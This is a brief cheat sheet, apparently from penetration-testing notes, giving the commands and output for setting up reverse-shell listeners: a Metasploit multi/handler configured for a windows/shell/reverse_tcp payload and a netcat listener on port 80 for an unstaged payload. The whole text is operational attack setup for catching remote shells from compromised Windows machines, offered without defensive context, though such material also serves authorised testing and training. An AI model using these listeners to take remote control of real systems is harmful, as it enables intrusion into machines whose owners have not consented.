### Metasploit multi/handler listener
	
	use exploit/multi/handler
	
	msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
	
	msf exploit(multi/handler) > set lhost 192.168.1.109
	
	msf exploit(multi/handler) > set lport 1234
	
	msf exploit(multi/handler) > exploit

### Netcat listener (unstaged payload)

	root@kali:~# nc -nvlp 80
	
	nc: listening on :: 80 ...
	
	nc: listening on 0.0.0.0 80 ...